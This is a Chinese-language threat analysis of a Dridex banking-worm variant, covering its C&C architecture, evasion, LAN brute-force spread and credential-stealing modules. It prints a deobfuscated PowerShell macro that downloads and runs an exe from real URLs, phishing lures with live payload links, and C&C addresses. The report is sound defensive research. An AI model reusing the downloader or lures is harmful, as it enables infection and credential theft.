作者：启明星辰ADLab

#### 一、分析简述

2017年8月底，启明星辰ADLab监测到客户的一个IP地址频繁地向多个邮箱地址发送邮件同时利用弱口令方式扫描内网，经过分析确认该攻击的始作俑者为P2P银行窃密型蠕虫
---Dridex的新型变种(由于该蠕虫不同版本均有一个或多个名称，为了便于描述，本文统称为Dridex蠕虫)。Dridex也被称为Bugat/Cridex/Feodo/Emotet/
Heodo。该蠕虫通过利用其所感染的大量主机结合P2P的去中心化设计思想，构建出了一个复杂而隐蔽的用于中转流量的P2P蠕虫代理网络，不仅如此，为了隐藏那个背后控制着这一切的幽灵，该蠕虫实现上还在P2P网络与控制端服务器之间加了一层壁垒(后端C&C，见后文分析)。

Dridex蠕虫除了拥有复杂P2P控制机制外，还是一款以窃取银行账户凭证为目的，集僵尸、窃密木马、邮件蠕虫等众多功能于一体的综合性蠕虫病毒。为了更好地分析和掌握该蠕虫新变种的攻击动向，我们对其进行了长期的追踪和分析。

Dridex蠕虫的新型变种通过P2P、多层代理、快速变异、内外网双渠道感染、RSA-AES通信加密等技术变得比以往任何时候都强大。新变种除了具备以往Dridex以邮件方式传播外，还具备内网传播的功能，扩大感染面。并且为了与安全软件对抗，新变种会频繁的更新组件并且利用多种免杀打包器对其进行加密变形处理，每隔1个小时左右便会从远程进行自我更新。更新后的模块不仅加密免杀方式不同，而且编译时间、程序图标、二进制代码都会发生改变，通过不断变换加密混淆器的方式来对样本文件进行频繁更新以躲避安全软件查杀。下图是部分自我更新的变种样本：

![](https://images.seebug.org/content/images/2018/01/ae637f4e-aba8-48c9-98f6-77b6e8ba0a7d.png-w331s)
图1-1变种样本样例

此外，通过对样本代码及通信流量的解密分析发现，当前变种Dridex几乎每个样本都会内置10个左右的C&C，其中大部分C&C只是由感染机转化而来作为代理使用，并非真实C&C。通过长时间的追踪分析，我们发现了221台这样的C&C服务器(加上无法辨识的新旧版本的C&C共有1175个，主要使用80、443、7080、8080、8081端口作为服务端口)，以及上千个受感染的主机和大量受害者的邮箱登录凭证信息。此处需要说明的是，这些作为数据回传的C&C实际上大部分并非为真正的C&C服务器，而是受Dridex感染并且被利用来作为代理节点的受害者服务器。

图1-2和图1-3是由我们根据Dridex的C&C归属地绘制的分布地图：

![](https://images.seebug.org/content/images/2018/01/44f52ea9-499d-4d09-8d42-123ef728e1de.png-w331s)
图1-2受害者感染地图分布

![](https://images.seebug.org/content/images/2018/01/2fb6958c-742d-4af2-ac84-8bfef1a50795.png-w331s)
图1-3 C&C按国家或地区分布

从分布图中可以看出，该蠕虫病毒的C&C（大部分是受害者服务器）主要分布在美国、德国、法国和加拿大。虽然该蠕虫长期以欧美等国家为目标，但通过分析我们发现有很多中国区用户也受到了该蠕虫的攻击，甚至还存在有一定数量的中国区受害者服务器目前或者曾经被该蠕虫用作回传窃密信息的中转服务器。这些服务器IP地址及归属地如图1-4所示：

![](https://images.seebug.org/content/images/2018/01/f0e9dfc3-2d07-4625-86f4-bb67cc613322.png-w331s)
图1-4 部分被用作回传窃密信息的中转服务器

#### 二、Dridex蠕虫网络架构分析

该蠕虫病毒的网络架构被设计来隐藏黑客真实的C&C服务器，其呈现出四层的网络架构，其中第一层(普通感染末端)由大量的普通感染机组成，第二层为复杂P2P代理网络层，第三层为前端C&C，第四层为黑客真实的C&C据点
--后端C&C。

Dridex简单网络架构图示如下：

![](https://images.seebug.org/content/images/2018/01/fc2a75c0-deff-4195-82fc-4e9a1a7bf533.png-w331s)
图2-1 Dridex网络架构图

如上图所示，第二层的代理主机实际上也是受到Dridex攻击的受感染机，Dridex利用去中心化的技术（P2P技术）来为后端C&C做掩护。Dridex一旦感染上一台主机后，会根据感染机特性(是否是服务器、是否处在公网中等条件)选取一部分感染主机作为其P2P网络的一个代理节点。这些代理节点会直接转发流量给C&C前端服务器，最后通过C&C前端将数据汇总到C&C后端服务器。

第三层的前端C&C实际上是一台由黑客成功入侵并控制的linux或者windows服务器主机，此服务器上开启了Nginx
Servers服务用来作为HTTP代理，这些代理主要以8080端口或者443端口作为代理连接口。前端C&C并不承载任何功能，其唯一的目的就是作为Dridex蠕虫P2P代理节点与后端C&C之间数据通信的中转站用于转发数据。

Dridex蠕虫的第四层(后端C&C)才是黑客实际控制端C&C服务器，其在前端代理C&C背后实现命令控制、扩展组件下发、接收回传的窃密信息等功能。

Dridex背后的黑客通过在大量感染机中选择处于外网的主机作为P2P代理节点，这些节点组成了Dridex蠕虫第二层的P2P代理网络。P2P代理网络的每台主机IP地址都是由后端C&C所管理，并且随机选择10-20个IP作为C&C列表下发给新更新的Dridex样本使用，同时也可能下发给新感染的主机使用。每个被感染的主机内存中都会存在一个Loader模块来用于收集本机信息实现上线，上线数据用于确定该感染机是服务器、处于外网的普通PC还是处于内网的普通PC等等，以此来决定该感染机的用途。之后Loader会不断轮询试探后端C&C来执行相应的功能，如下载各种窃密组件、服务组件、内网感染组件、外网感染组件等等。下载内网感染组件和外网感染组件分别用于蠕虫的内外网的自我传播。

Dridex蠕虫工作原理图如下：

![](https://images.seebug.org/content/images/2018/01/b29d86a6-ccad-449c-9609-571120ad8ce1.png-w331s)
图2-2 Dridex蠕虫工作原理图

此蠕虫病毒具有以下几大特点：

采用P2P方式将部分符合条件的感染机作为代理节点（伪C&C），样本的功能组件下载、恶意邮件群发、银行凭证窃取与上传、浏览器网页登录凭证窃取与上传、邮箱登录凭证窃取与上传等功能均采用不同代理点来传输。

后端C&C隐藏在P2P代理节点和前端C&C之后，难以追踪和发现真正的C&C服务器。

新型变种有极快的更新速度，在实际分析中发现频率最高的时候1个小时就更新一次，每次的样本名称、图标、采用的混淆机制、免杀机制都有较大的改变。

Dridex新变种背后的黑客拥有强大的自动化平台工具，通过自动随机选择免杀混淆壳处理更新样本下发给Loader执行。

双管齐下的内外网感染模式，一种是通过弱口令方式感染局域网主机并在远程主机上创建服务；另一种是通过从C&C下载黑客收集的大量电子邮箱登录凭证登录并向指定的大批量邮件地址发送带有Dridex恶意代码的邮件。

完整的闭环感染模式以完成自动化的扩散，如收集邮箱凭证下发给感染主机用于向目标发送恶意邮件，一旦新的接收者感染该蠕虫后，又会继续收集邮箱凭证给C&C，同时局域网感染将加速这个过程的进行。

#### 三、Dridex历史回溯

Dridex前身Cridex的最早版本于2011年9月被发现，在升级为Dridex后不断演变成多个版本的综合性蠕虫。其曾经发起过多次大规模的攻击行为，并且造成了非常严重的危害，下图我们列举了近几年来的一些关键事件。

![](https://images.seebug.org/content/images/2018/01/c76e259e-7ddb-4914-8456-1a1413aa983f.png-w331s)
图3-1 Dridex历史事件时间线

2014年7月，Seculert公司的安全研究员发现Dridex窃取了至少5万个邮箱的登录账号和密码信息列表，此时Dridex主要以感染德国和波兰为主，其他感染过的国家有奥地利、美国、瑞士、英国、意大利、荷兰等。

2015年5月，Dridex开始将js脚本文件作为邮件传播附件进行大面积传播，该js脚本文件用于下载Locky勒索软件执行。

2015年8月，经相关安全机构分析统计，在2015年间不到一年的时间里，Dridex已经入侵了横跨27个国家的成千上万家企业，并且已经导致英国2千万英磅(当时合3050万美元)以上的经济损失，以及美国1千万美金的经济损失。

2015年8月14日，FBI联合安全厂商捣毁了Dridex服务器并逮捕了一名Dridex幕后操控者。

2016年2月4日，Dridex发生了一次戏剧性事件，那就Dridex蠕虫病毒后端服务器疑被白帽子入侵，所有下载的模块被替换成了Avira杀毒软件。

2016年9月6日，安全研究人员发现新的Dridex变种开始用于窃取虚拟货币如比特币钱包。

2017年4月，Proofpoint研究人员观测到数百万次Dridex蠕虫攻击，其攻击手法与从前的攻击相似，同样通过邮件携带附件的形式进行疯狂的传播，只是新的攻击中添加了通过ZIP打包的vb脚本文件、PDF文件和可执行的PE文件。

2017年5月10日，Dridex蠕虫变种使用了原子注入技术发动攻击，以躲避安全产品的查杀。

2017年12月12日，前英国银行员工植入Dridex蠕虫帮助两位黑客洗钱，担任洗钱黑客的私人信托经理，利用伪造的身份证件开设了多达105个账户，汇款与转账超过250万英镑。

#### 四、Dridex演化过程分析

##### 4.1、传播渠道演变

Dridex前身Cridex的最早版本于2011年9月被发现。从最初的单纯以U盘作为传播媒介渐渐地发展为以邮件作为媒介，以office、pdf文档、js脚本作为载体进行自我传播，最后发展为以内外网双渠道传播，其中内网采用弱口令进行传播，外网仍然采用邮件进行传播。

![](https://images.seebug.org/content/images/2018/01/8615f44d-2c64-4b52-ae60-a3d7e82c5d6f.png-w331s)
图4-1 Dridex蠕虫传播渠道演变

##### 4.2、配置数据的演变

![](https://images.seebug.org/content/images/2018/01/dbed2ed3-425f-4f2d-9319-6376bffd6cae.png-w331s)
图4-2 Dridex蠕虫配置数据演变

Dridex与C&C通信都是通过特定的格式配置文件作为载体，从初期的版本开始这些配置文件都是经过加密传输的。之前所有版本的配置文件几乎都是以xml文件的形式存在，在我们发现的最新变种中这种长期使用的方式已被摒弃，进而直接采用纯加密二进制数据来进行传输。2011年，
Dridex主要通过动态的二进制xml文件更新C&C以及指定攻击的目标的指定；到2012年，Dridex0.77-0.80版本开始使用加密的明文xml文件作为C&C控制指令的下发并且加入web注入的功能；2014年初，Dridex1.10版本在xml配置文件中加入js脚本重定向功能；2017年，新一代的变种开始放弃xml配置文件，直接采用加密的二进制数据进行通信。

##### 4.3、功能与技术演变

Dridex蠕虫自2011年被首次发现后经历了6年的发展，其功能模块也随着网络安全大环境逐步演化。如图4-3，根据时间关系简单列出了Dridex这些年来的典型技术变化趋势。

![](https://images.seebug.org/content/images/2018/01/1dbea977-1805-4d75-a0e9-b2c35638359a.png-w331s)
图4-3 Dridex蠕虫功能与技术演变

2011年，Dridex蠕虫的扩散方式以USB感染为主，通过USB进行扩散。随着安全产品重点关注接入电脑中的U盘及网民安全意识的提升，USB感染方式在2012年被废弃。之后，Dridex背后的犯罪团伙开始专注于新的扩散方式和功能模块的开发，2015年Dridex携带着大量恶意功能模块卷土重来，如：VNC模块、屏幕截图模块、代理模块、中间人模块、键盘记录模块、Web注入模块。Dridex在2015年名噪一时，后经历FBI打击进入短时间沉寂，2016年Dridex利用原子注入技术绕过安全软件查杀，通过DNS缓存投毒对感染机投放钓鱼链接，并引入了更丰富的对抗模块，把安全研究人员和安全厂商的电脑信息列入黑名单，以此来躲避安全厂商和安全研究人员的分析。2017年，Dridex利用Windows默认的恢复光盘程序recdisc.exe绕过UAC，通过第三方工具窃取感染机上的凭证信息，如：浏览器密码，邮箱账号信息。最新的变种开始取消邮件传播中的附件，加入局域网感染功能，将反沙箱功能从之前宏中实现改变为了PE实现，使用加密混淆器实现快速自动化的变异，Dridex在长期演变过程中正变得越来越强大。

#### 五、典型样本剖析

我们当前所发现的Dridex变种是采用混淆免杀器进行处理，同时也将反沙箱、反调试的功能从先前的宏代码区移到了二进制PE文件中。免杀器通过两层内嵌的PE加密数据将真实的Loader代码隐藏起来。Loader由免杀器加载执行后，会收集本机信息作为上线信息向C&C服务器请求控制指令，C&C服务器会根据需要下发各种模块执行。其中，局域网感染模块通过局域网扫描将Loader作为感染实体进行传播；邮件模块会将原始带有恶意宏的office文档作为附件进行传播；窃密模块由多个具有窃密功能的模块组成，主要用于窃取邮箱登录凭证、浏览器网站登录凭证等信息。

![](https://images.seebug.org/content/images/2018/01/ee8ba2a1-eb76-4023-a97e-eeb79f7e7624.png-w331s)
图5-1 Dridex蠕虫模块执行图

##### 5.1、Loader分析

Loader是Dridex蠕虫的第一个二进制可执行模块，该模块是通过传播邮件附件中的office文档宏下载执行的，主要完成上线并且根据C&C配置的指令来完成扩展组件的下载与执行。这个模块实际由两层加密混淆器封装而成，这两层都是独立的PE，其中第二层加密混淆器作为加密数据存储于第一层加密混淆器的数据段部分，而实际的loader(同样也是PE)则加密存放于第二层混淆器的数据段部分。执行过程中，第二层加密混淆器和最终Loader实体都是不落地到磁盘的，直接被加载到内存中执行。

###### 5.1.1、沙箱环境检测类型

Loader的加密混淆器会通过检测沙箱环境来决定自身是否继续执行，以防止沙箱分析。如果当前环境满足如下条件，Loader的功能性代码将不会执行。

![](https://images.seebug.org/content/images/2018/01/8d6a6c09-0d39-4f69-9f9b-08338f290f76.png-w331s)
表5-1 沙箱监测条件

部分代码如下：

![](https://images.seebug.org/content/images/2018/01/2bba85f7-8b36-4cf2-9079-9226aeb0869c.png-w331s)
图5-2检测沙箱环境

###### 5.1.2、安装与驻留

当混淆加密器执行完成后，会将真实Loader可执行代码解密并加载到内存中执行，此处并不会将解密后的Loader写入到磁盘中。Loader代码执行后便会开始安装蠕虫病毒，安装后的文件名称是由受害者的主机硬件信息计算而得，在一定程度可减少被查杀的几率。首先，从内存中解密一个生成目标安装名称的字符串数组，内容如图5-3所示：

![](https://images.seebug.org/content/images/2018/01/23219591-beec-4afc-acc1-9d175cfdb588.png-w331s) 图5-3名字表

然后，根据C盘序列号计算出2个整数作为上面字符数组的下标。最后，将这两个字符串拼接生成安装文件名。因此，安装在不同机器上的病毒文件的名称均不相同。

接下来，Loader会根据当前文件全路径计算得到一个长度为4个字节的字符串作为Event和Mutex，文件路径计算方法如图5-4所示：

![](https://images.seebug.org/content/images/2018/01/9038e7d4-b736-4ceb-9de8-21516551b9a9.png-w331s)
图5-4 计算Event和互斥体名

例如：C:\Windows\System32\logoncrypt.exe经过计算后得到的是字符串DAB0BF1F，然后在该字符串前面加上“E”或者“M”分别作为事件和互斥体名。形如：

Event="EDAB0BF1F"  
Mutex="MDAB0BF1F"

然后，Loader会依据不同版本的目标操作系统采用两种方式进行自启动方式的设置。

如果权限允许则通过服务方式实现开机自启动，服务名称由C盘序列号计算而得。服务创建代码如图5-5所示：

![](https://images.seebug.org/content/images/2018/01/dcfde7ce-5dec-4944-ab49-b24ed835166e.png-w331s)
图5-5 创建服务启动

如果目标主机开启了UAC而无法通过服务方式来启动，则直接向注册表的HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run键写入启动的PE文件路径，功能代码如图5-6所示。

![](https://images.seebug.org/content/images/2018/01/07ccfa42-acfc-42f6-a463-7b8bceeffdb1.png-w331s)
图5-6 写注册表实现自启动

此外，蠕虫在安装之前会测试C&C服务器是否有效，如果无效，便不会进行安装操作。

###### 5.1.3、获取上线信息

Loader将蠕虫成功安装后，便会上线通知C&C并且以此获取执行指令。该变种Dridex的C&C是内嵌在Loader文件中的加密数据中，每个样本大概有10-20个数量不等的C&C。解密后C&C数据格式如图5-7所示：

![](https://images.seebug.org/content/images/2018/01/efc5f945-95e0-4ec3-a7dd-e14f16970307.png-w331s)
图5-7 内置的C&C信息

该列表每一项为8个字节的二进制数据，其中前4个字节为IP地址后4个字节为端口。比如在0x001B1278地址存储的是IP：0x6BAAB199转为点分十进制后得到IP地址为107.170.177.15。在0x001B127C地址存储的是端口信息，0x00001F90，转为十进制后为8080。

Dridex蠕虫病毒通过调用一个使用频率较低的Windows API（CreateTimerQueueTimer）来启动上线和扩展组件的下载。

![](https://images.seebug.org/content/images/2018/01/4c252b21-8b15-4d95-9293-734f04e95ea7.png-w331s)
图5-8 启动定时队列回调

通过该API来实现定时队列调用，每一秒钟启动回调函数执行。回调函数中使用一个全局控制标志来控制代码执行流程。

回调函数在经过一系列初始化工作之后，将系统中的进程列表、系统版本型号等信息加密发送给控制端完成上线操作，C&C服务器会根据上线信息来下发合适的扩展组件执行。

![](https://images.seebug.org/content/images/2018/01/a6e5a378-835a-4146-a6a9-a3383395819e.png-w331s)
图5-9 获取系统信息

![](https://images.seebug.org/content/images/2018/01/b5ebccee-c179-42ae-a0dc-e7f61db48803.png-w331s)
图5-10 进程列表

在我们分析期间，该样本自我更新速度非常快，而且更新的样本编译时间基本没有规律，可以看出Dridex新变种的C&C服务器后端是一个高度自动化的样本生成平台。

###### 5.1.4、上线协议分析

该样本的上线数据是通过POST方式提交给控制端服务器的。上线信息中携带了当前样本的运行模式、样本CRC值、感染机的硬件标识，进程列表信息等内容。

通信过程中，样本会将启动时随机生成的AES秘钥通过RSA加密后发送给C&C服务器，C&C服务器得到秘钥后通过自有私钥解密，获得通信秘钥。之后，样本的所有通信数据都通过该秘钥进行加密，其采用的加密算法为AES-128-CBC。内置的公钥数据如图5-11所示：

![](https://images.seebug.org/content/images/2018/01/8603ab09-eb25-4dc8-b20f-a54b144b8986.png-w331s)
图5-11 内置公钥

通过对多个蠕虫样本的跟踪，我们发现这个公钥每隔2-5天会更换一次。

此外，样本通过ObtainUserAgentString函数获取Windows操作系统下的User-Agent，然后构造HTTP的POST请求发送给C&C服务器。比较有意思的是，请求成功后，服务器端会返回“伪404”响应来传输数据，猜测可能是为了绕过IDS检测或者迷惑运维人员。网络请求的数据包如图5-12所示：

![](https://images.seebug.org/content/images/2018/01/048267a4-5227-414d-9a55-931a05e1234c.png-w331s)
图5-12 POST请求和应答

发送的数据结构内容的二进制代码如图5-13所示：

![](https://images.seebug.org/content/images/2018/01/fb164f27-6a73-4cc7-8158-828151fb9dc5.png-w331s)
图5-13 构造数据包

接收的数据内容解密的二进制代码如图5-14所示：

![](https://images.seebug.org/content/images/2018/01/4f03844c-ea05-4b77-a24b-5e7e0d95bf9e.png-w331s)
图5-14 解密数据包

通过对通信数据加密、解密逻辑的分析发现，发送数据的前0x60字节存储的是被公钥加密的KEY，从0x61-0x74存储的是发送明文的SHA1，从0x75字节开始到结尾的数据是被AES加密的数据。服务器接收到请求数据后，首先会通过私钥解密前边的KEY，然后用这个KEY来解密0x74之后的密文，最后通过计算解密后的内容的SHA1来和0x61-0x74的HASH进行比较，来确认数据是否被篡改。当被蠕虫感染的主机接收服务器返回的内容时，会使用前面生成的KEY对0x75字节之后的数据进行解密，然后计算解密后的明文SHA1，最后通过公钥对该HASH进行签名认证。

根据前面分析的通信数据格式，我们可以看出，每条数据并没有携带时间戳，因此Dridex蠕虫病毒存在数据包重放漏洞。

###### 5.1.5、启动执行下载组件

Loader模块只是作为一个先导模块用于安装驻留，本身并没有实现相关的恶意操作，具体恶意操作均由从C&C端下载而来的扩展组件实现。在需要下载扩展组件执行时，Loader会从自带的一个C&C列表中顺序连接这些C&C下载相应的扩展组件执行。根据对Loader中的启动逻辑的分析，我们发现其有3种不同的组件执行方式：

（1）落地启动进程：这种方式下载的程序文件为exe可执行文件，下载的模块文件会写到磁盘中，可用于Dridex
Loader的自动升级和扩展组件的下载，实现代码如图5-15所示：

![](https://images.seebug.org/content/images/2018/01/7b5a06c5-ca14-49b0-9c0f-fc8a5f8f0afd.png-w331s)
图5-15 落地文件

（2）内存加载DLL，这种方式主要用于下载扩展DLL组件，下载的模块文件不落地磁盘。样本通过自主实现的PE加载器直接将下载到内存中的PE格式数据加载执行，如内网感染模块、邮件传播模块、窃密模块等都是由此下载执行。部分代码如图5-16所示：

![](https://images.seebug.org/content/images/2018/01/b4e9c8fb-45ea-484b-a254-faec43188487.png-w331s)
图5-16 线程启动DLL

（3）指定session执行下载模块，同样可用于自我更新和扩展组件执行，下载的模块文件会写入到磁盘上。由于该样本在Windwos
XP和没有开启UAC的机器上会通过服务启动，所以当有些功能模块（如登录凭证获取）加载时需要借助当前登录用户的身份。如果当前系统开启UAC,落地文件则以当前登录用户启动。功能代码如图5-17所示：

![](https://images.seebug.org/content/images/2018/01/af989dc3-63e8-4554-9794-6fa75a251719.png-w331s)
图5-17 根据不同环境创建进程

##### 5.2、内网感染模块分析

内网感染模块是Loader下载的用于局域网传播的模块，该模块是一个DLL文件，采用第二种方式加载执行。其主要功能就是扫描感染主机局域网并尝试弱口令爆破目标，如果成功则使用Loader程序感染局域网内其他主机。其中弱口令密码字典加密存储在该模块的数据区，通过对加密数据解密后统计其自身携带有共计999个密码项的密码字典。部分经过解密的弱口令密码内容如图5-18所示：

![](https://images.seebug.org/content/images/2018/01/f4d17a77-9de8-4868-ba77-93bc8fb4b706.png-w331s)
图5-18 部分弱口令

感染局域网过程如下：

调用WNetEnumResourceW，枚举系统所有连接的网络资源。

使用空口令调用WNetAddConnection2W，建立网络链接。

如果连接失败，则调用NetUserEnum枚举系统所有用户，然后使用上边内置的弱口令对网络资源进行连接。如果连接成功，则将当前的Loader文件拷贝到目标主机上并以服务的方式启动执行。局域网电脑的伪代码，如图5-19所示。

![](https://images.seebug.org/content/images/2018/01/6a8dd327-2cf4-4e3a-9696-0a20f93144af.png-w331s)
图5-19 感染局域网伪代码

##### 5.3、邮件传播模块

邮件传播模块要以群发带有恶意word、excel等文件附件的邮件来达到外网感染的目的，该模块延续了老版Dridex的感染模块，但不同的是新型变种采用了SSL加密STMPS协议进行邮件的传播感染，使得IDS，IPS等设备难以监测。邮件感染模块在进行邮件传播之前，会向C&C服务器(与Loader类似，以加密C&C列表方式内嵌在PE文件中)请求大量的邮箱账号和密码作为发送者，大量邮箱地址作为收件者（攻击目标）以及邮件内容模板作为感染邮件内容。而这些信息的请求都是通过RSA+AES的方式进行加密，通信协议类似Loader，但内置的公钥不同。公钥内容的内存dump如下：

![](https://images.seebug.org/content/images/2018/01/57ebccf5-015f-4c12-a39f-51cd9dac13bc.png-w331s)
图5-20 公钥数据

邮件感染模块在进行感染传播过程中会将一段固定格式的数据作为攻击结果和状态回馈给C&C服务器，这段数据同样也是加密传输，采用的通信方式是HTTP
POST方式。我们通过逆向还原了该结构如下：

    
    
    struct POSTMAILSERVER
    {
    int nFlag;          //常量0x5818DA3
    char *strSingleFlag;    // 机器名+C盘卷标识
    int nLenFlag;       // strSingleFlag的长度
    int nCountNum;      //邮件发送序号
    int nCountSend;     //邮件发送个数
    int nCountSuccess;  //邮件发送成功个数
    int nSuccessNum;    //邮件发送成功序号
    };

此外，模块在请求发件人账号密码、收件人邮箱地址、邮件内容模板时该结构初始化为0。

表5-2是其中用于请求数据和回馈数据的C&C。

![](https://images.seebug.org/content/images/2018/01/d0b998a2-081e-4cfc-bbf7-85f309d61843.png-w331s) 表5-2 用于请求数据和回馈数据的C&C

如果请求的POST数据合法，C&C服务器则会返回这三种类型的信息。

###### 5.3.1、获取发送邮件账户信息

邮件感染模块会向C&C服务请求大量的邮箱账户和密码信息。黑客通过Dridex将窃取到的大量邮箱账号登录凭证信息上传到C&C服务器中，并利用这些已窃取的邮箱登录凭证用于传播Dridex，新传播的Dridex又会将窃取到的邮箱登录凭证上传给C&C服务器，这样Dridex的感染路径就形成了一个自我传播的正反馈回路，大大增强了感染速度。在追踪分析过程中，我们发现了近千个邮箱的登录凭证，图5-21是分析过程中所dump出的部分邮箱登录凭证。

![](https://images.seebug.org/content/images/2018/01/5adf5930-24ea-434d-834a-9bbf59911336.png-w331s)
图5-21 部分邮箱登录凭证

###### 5.3.2、获取接收者邮箱信息

接收者邮箱同样也是由C&C指定，这些邮箱地址的用户名看起来比较像根据字典生成的，但是目前无法完全确认，也有可能是窃密模块收集的受害者的邮件联系人。部分受害者邮箱见表5-3。

![](https://images.seebug.org/content/images/2018/01/9e82120b-ef73-4b23-8827-0e6b7730a117.png-w331s)
![](https://images.seebug.org/content/images/2018/01/58af834e-1029-4c2e-8975-4050239fb016.png-w331s)
表5-3 部分受害者邮箱列表

###### 5.3.3、获取邮件内容

Dridex的邮件内容是由C&C指定并由邮件传播模块下载并组装成邮件发送到受害者邮箱。这样黑客可以更加灵活的构造邮件内容，一方面可以在传播过程中调整邮件内容更好地欺骗受攻击者，另一方面还可以快速更换已经被列为垃圾邮件或者恶意邮件的内容，提高感染率。下面是两封邮件的例子:

邮件内容1

    
    
    Dear {RCPT.NAME},
    I have paid the outstanding balance today by bank transfer - $4124.81.
    Please see attached our new address details, please could you update your records.
    http://fwstation.com/New-invoice-738536/GB-MCB/2017-12-Oct-17/
    
    Thanks for your business!
    {FRIEND.NAME}
    {FRIEND.EMAIL}

邮件内容2

    
    
    I have herein attached the Oct 2017 Invoice.
    Can you please confirm receipt.
    You may click on this link to make payment http://favrefamily.ch/Invoice-Dated-12-Oct-17-97802834/POA-QSCSF/2017/
    http://favrefamily.ch/Invoice-Dated-12-Oct-17-97802834/POA-QSCSF/2017/
    
    Thank you!

邮件内容都是与银行、金融相关的信息，新变种的传播邮件没有将恶意payload附在邮件的附件中，而是在邮件内容中提供payload的链接，这在一定程度上降低了被杀毒软件查杀的风险。

Payload文件与之前版本的Dridex类似，都是一个携带有恶意宏的Office文档。打开后的内容如下：

![](https://images.seebug.org/content/images/2018/01/b3808bae-f762-40ed-b74d-0b121b47f30e.png-w331s)
图5-22 payload-office1

另一个会显示如下页面：
![](https://images.seebug.org/content/images/2018/01/0ad682ae-48f1-43cf-8f80-a183d3b376a5.png-w331s)
图5-23 payload-office2

两个文件的内容排版虽然不同，但都是诱惑用户去开启宏。并且两个word宏解密后的内容是相同的。

![](https://images.seebug.org/content/images/2018/01/dbd4fa5a-5851-4341-83ca-81ba7f317c14.png-w331s)
图5-24 宏代码

去混淆后，我们得到如下脚本：

    
    
    $wscript = new-object -ComObject WScript.Shell;
    $webclient = new-object System.Net.WebClient;$random = new-object random;
    $urls = 'http://justinhophotography.com/PaT/,
    http://ashtralmedia.com/DqrESMyO/,
    http://anosales.net/JwZDg/,
    http://earthwind.com/fi/,
    http://henkbruurs.nl/Sq/'.Split(',');
    $name = $random.next(1, 65536);
    $path = $env:temp + '\\' + $name + '.exe';foreach($url in $urls){try{$webclient.DownloadFile($url.ToString(), $path);
    Start-Process $path;break;}catch{write-host 
    $_.Exception.Message;

通过脚本内容我们可以看到一个url列表，脚本通过这个url列表中url拼凑一个完整exe文件的下载路径并启动执行。因而，一旦目标用户点击了word并启用了宏，该恶意的exe文件便会获得执行，而这个文件就是我们当前所分析的Loader模块。

##### 5.4、窃密模块

在对最新的Dridex蠕虫跟踪分析过程中，我们捕获了多个窃密模块，其中3个比较重要的模块分别是邮箱窃密模块、浏览器窃密模块以及Outlook窃密模块。由于P2P网络层的原因，不同的窃密模块直接通信的IP地址会有所不同，当然这些IP只是P2P网络中的节点，并非真实C&C服务器。虽然直接通信的IP不同，但是由于后台C&C为同一个C&C服务器，所以这三个窃密模块与C&C通讯时使用的公钥是相同的，并且和邮件传播模块的公钥也为同一个公钥。为了实现传播的正向反馈，窃密模块回传给C&C后端服务器的邮箱登录凭证经过处理后，再由C&C下发给其他感染机用于传播。

通过对这三个窃密模块的分析发现，邮箱窃密模块和浏览器窃密模块的代码来自Nirsoft提供的凭证dump工具，邮箱窃密模块包含了Outlook窃密模块的功能。这三种模块都会将窃密信息保存到C:\ProgramData\XXXX.tmp目录中，并在合适的时机加密上传给C&C服务器。

（1）我们从邮箱窃密模块的PDB信息中发现了如下路径信息，可推断该模块重用了Nirsoft的Mail PassView工具。它的PDB信息如图5-25所示：
![](https://images.seebug.org/content/images/2018/01/e47ad13f-b25c-41a2-9280-36c26fa3e560.png-w331s)
图5-25 PDB路径

Mailpv是Mail PassView工具。该工具支持Outlook Express、Microsoft Outlook、Windows
Mail、Windows Live Mail、IncrediMail、Eudora、Netscape、Mozilla Thunderbird、Group
Mail Free、Yahoo Mail、Hotmail、Gmail、Google Talk等类型邮箱的账户获取，软件界面如图5-26所示：

![](https://images.seebug.org/content/images/2018/01/ad17b878-faa6-4121-a8c6-2616712e537e.png-w331s)
图5-26 Mail PassView

当该模块以命令行参数/scomma
"C:\ProgramData\xxxx.tmp"启动时，不会显示应用程序的窗口，从而实现静默执行。获取到的密码会保存到该指定目录下，在邮箱窃密模块中，该目录名是随机生成的。

窃密的文件格式如下：

    
    
    username,Outlook 2016,username@sina.com,imap.sina.com,993,No,IMAP,username,password,Outlook,Strong,smtp.sina.com,587

（2）浏览器窃密组件则是利用nirsoft的组件工具WebBrowserPassView实现的。该工具的工作界面如下：

![](https://images.seebug.org/content/images/2018/01/400119b8-c046-4664-8a95-5a0e6e43682d.png-w331s)
图5-27 WebBrowserPassView

我们从内存中获取到的WebBrowserPassView版本为1.8.0.0，版本信息如图5-28所示：

![](https://images.seebug.org/content/images/2018/01/b873e780-a9fe-4128-a8a6-303267b2c42f.png-w331s)
图5-28 WebBrowserPassView版本信息

其获取的窃密信息文件内容如下：

    
    
    URL,Web Browser,User Name,Password,Password Strength,User Name Field,Password Field,Created Time,Modified Time
    https://xxx.com/home,Chrome,test@sina.com,test,Strong,username,password,2017/10/9 15:22:07,
    https://www.xxx.org/users/sign_in,Chrome,test@sina.com,test,Strong,user[email],user[password],2017/10/9 10:22:20,

（3）Outlook窃密模块是通过com组件CLSID_OlkAccountManager来获取Outlook的账号密码信息。首先，通过注册表键值HKEY_LOCAL_MACHINE\Software\Clients\Mail\Microsoft
Outlook获取所需加载的com组件路径并加载，如图5-29 所示：

![](https://images.seebug.org/content/images/2018/01/d947134b-976c-40a2-925f-a0c0769b47db.png-w331s)
图5-29 获取OLMAPI32.dll路径

然后，通过com组件CLSID_OlkAccountManager来获取Outlook的账号密码信息，二进制代码如图5-30所示。

![](https://images.seebug.org/content/images/2018/01/d4bc9dea-a0be-4f3c-ae48-262752ea94ab.png-w331s)
图5-30 CLSID_OlkAccountManager

最后,将收集到的帐号密码信息以"\r\n%s<%s>"格式写入到指定的文件中，文件内容如下:

    
    
    Microsoft\Office\16.0\Outlook
    test<test@sina.com>

收集到账号信息后，模块会再次构造POST请求并将获窃取到的账户信息回传给C&C服务器。

    
    
    struct POSTMAILSERVER
    {
    int nFlag;          // 常量0x041C0F76
    ​char *strSingleFlag;   // 机器名+C盘卷标识
    int nLenFlag;       // strSingleFlag的长度
    int nLenBuf;            // 账户文件UTF8编码缓冲
    LPVOID lpBufAccount;    // 账户文件内容
    };

构造请求的伪代码如图5-31 所示：

![](https://images.seebug.org/content/images/2018/01/2c51fdb0-ca81-4051-a15b-b8bcdd2a5d82.png-w331s)
图5-31 构造POST请求上传密码数据

#### 六、Dridex新变种专杀工具

